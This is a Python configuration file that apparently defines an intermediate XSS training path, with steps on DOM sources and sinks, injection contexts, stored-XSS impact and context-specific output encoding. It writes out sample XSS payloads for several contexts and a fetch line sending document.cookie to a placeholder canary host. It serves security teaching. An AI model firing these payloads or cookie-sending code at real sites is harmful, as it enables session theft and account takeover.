# ruff: noqa: E501
"""XSS Intermediate learning path configuration."""

from apps.investigation_core.models.learning import GuidedStep, LearningPath

XSS_INTERMEDIATE = LearningPath(
    path_id="xss_intermediate_01",
    title="XSS — Intermediate",
    difficulty="intermediate",
    finding_types=["xss_stored", "stored_xss", "dom_xss", "xss_context_analysis", "xss"],
    required_skills=["xss_fundamentals", "xss_context_analysis"],
    learning_objectives=[
        "Identify DOM-based XSS sources and sinks",
        "Analyse injection context (attribute, script, CSS, event handler)",
        "Construct context-appropriate payloads without alert(1)",
        "Assess persistent (stored) XSS impact chain",
        "Document scope including affected user populations",
    ],
    guided_steps=[
        GuidedStep(
            step_id="xss_i01_s01",
            title="Identify DOM-Based Sources and Sinks",
            explanation=(
                "DOM XSS occurs entirely in the browser — no server involvement. "
                "Sources are where attacker input enters the DOM (location.hash, "
                "document.referrer, URL parameters read via JS). "
                "Sinks are where it is rendered (innerHTML, document.write, eval, setTimeout). "
                "Trace the data flow from source to sink in the page's JavaScript."
            ),
            why_this_matters=(
                "DOM XSS bypasses server-side output encoding because the vulnerability "
                "exists in client-side JavaScript. Traditional WAFs and scanner detection "
                "often miss it. Understanding source-sink flow is essential for "
                "meaningful DOM XSS investigation."
            ),
            expected_evidence="Source and sink identified in page JavaScript with annotated code snippet",
            learner_input=(
                "Open DevTools → Sources. Search for: 'location.hash', 'location.search', "
                "'document.referrer'. Then search for sinks: 'innerHTML', 'document.write', 'eval'. "
                "Trace if any source value reaches a sink without sanitisation."
            ),
            completion_validation="Source (input) and sink (execution point) identified in page JS",
        ),
        GuidedStep(
            step_id="xss_i01_s02",
            title="Analyse Injection Context",
            explanation=(
                "Where your payload lands determines which characters matter and which payload works. "
                "HTML body: `<img src=x onerror=alert(1)>`. HTML attribute: `\" onmouseover=alert(1)`. "
                "Inside `<script>` block: `</script><script>alert(1)</script>`. "
                "CSS property: `expression(alert(1))` (IE) or break out of style block. "
                "Inspect the page source with your reflected input to determine context."
            ),
            why_this_matters=(
                "A payload designed for the HTML body won't execute in a JavaScript string context. "
                "Context analysis is what separates a working exploit from a non-executing payload. "
                "It also determines what the correct output encoding fix is."
            ),
            expected_evidence="Annotated source showing reflection context with corresponding payload type",
            learner_input=(
                "Submit a unique marker (e.g. 'xss_probe_123'). View page source. "
                "Find where it appears. Note: is it inside a tag? An attribute? A script? "
                "Select the payload type appropriate for that context."
            ),
            completion_validation="Context identified with specific payload type documented",
        ),
        GuidedStep(
            step_id="xss_i01_s03",
            title="Confirm Execution with Context-Appropriate Payload",
            explanation=(
                "Move beyond alert(1). For intermediate investigation, use: "
                "`alert(document.domain)` — confirms execution context matches the target origin. "
                "`fetch('https://canary.example/'+document.cookie)` — demonstrates cookie access "
                "without actually exfiltrating data to a third party. "
                "Use a controlled canary endpoint you own, not public services."
            ),
            why_this_matters=(
                "`alert(document.domain)` proves the payload executes in the application's origin, "
                "confirming that cookies, localStorage, and DOM data for that origin are in scope. "
                "This is the evidence that transforms 'XSS possible' into 'XSS confirmed exploitable'."
            ),
            expected_evidence="Screenshot of alert(document.domain) executing in target origin",
            learner_input=(
                "Inject alert(document.domain) via the identified context. "
                "Capture screenshot showing the domain in the dialog box. "
                "Record the exact parameter and payload for the finding report."
            ),
            completion_validation="Execution confirmed in correct origin (alert shows target domain, not injected string)",
        ),
        GuidedStep(
            step_id="xss_i01_s04",
            title="Assess Stored XSS Impact Chain",
            explanation=(
                "For stored XSS, the impact is who sees the payload, not just the injector. "
                "Assess: Does the injected value appear to all users? To admins only? "
                "To the injector only? Each scenario has different severity. "
                "Admin-visible stored XSS enables account takeover and privilege escalation "
                "even for unprivileged injectors."
            ),
            why_this_matters=(
                "A stored XSS that executes in an admin's browser can steal session cookies, "
                "modify admin settings, or create backdoor admin accounts — from a low-privilege "
                "attacker's single injection. Scope assessment determines severity rating."
            ),
            expected_evidence="Impact assessment note: who sees the payload, what data is in scope",
            learner_input=(
                "Log in as a second test user and check if stored payload triggers. "
                "Check admin panels if accessible in the lab. "
                "Document: user roles affected, data accessible in that context, "
                "worst-case scenario for this injection point."
            ),
            completion_validation="Impact assessment completed with affected user scope documented",
        ),
        GuidedStep(
            step_id="xss_i01_s05",
            title="Document with Output-Context Remediation",
            explanation=(
                "Intermediate XSS documentation must specify the correct fix by context: "
                "HTML body → HTML entity encoding. HTML attribute → attribute encoding. "
                "JavaScript string → JavaScript string escaping. URL parameter → URL encoding. "
                "Generic 'sanitise input' advice is insufficient — the correct encoding depends "
                "on where the output is placed."
            ),
            why_this_matters=(
                "Developers who receive vague 'sanitise user input' recommendations often apply "
                "input-side filtering that bypasses are trivial. "
                "Context-specific output encoding guidance leads to correct fixes. "
                "Without it, partial remediations frequently leave the vulnerability open."
            ),
            expected_evidence="Finding report with context-specific encoding recommendation and code-level guidance",
            learner_input=(
                "Write a remediation recommendation that specifies: "
                "(1) the exact rendering context, "
                "(2) the correct encoding function for that context in the app's language/framework, "
                "(3) whether a templating engine auto-escapes in this context or must be explicitly called."
            ),
            completion_validation="Remediation includes context-specific encoding function name and framework guidance",
        ),
    ],
    completion_checks=[
        "DOM source and sink identified in page JavaScript",
        "Injection context classified (body / attribute / script / CSS)",
        "Context-appropriate payload confirmed executing in target origin",
        "Stored XSS impact scope documented (affected user roles)",
        "Remediation specifies context-specific output encoding function",
    ],
    next_paths=[],
)
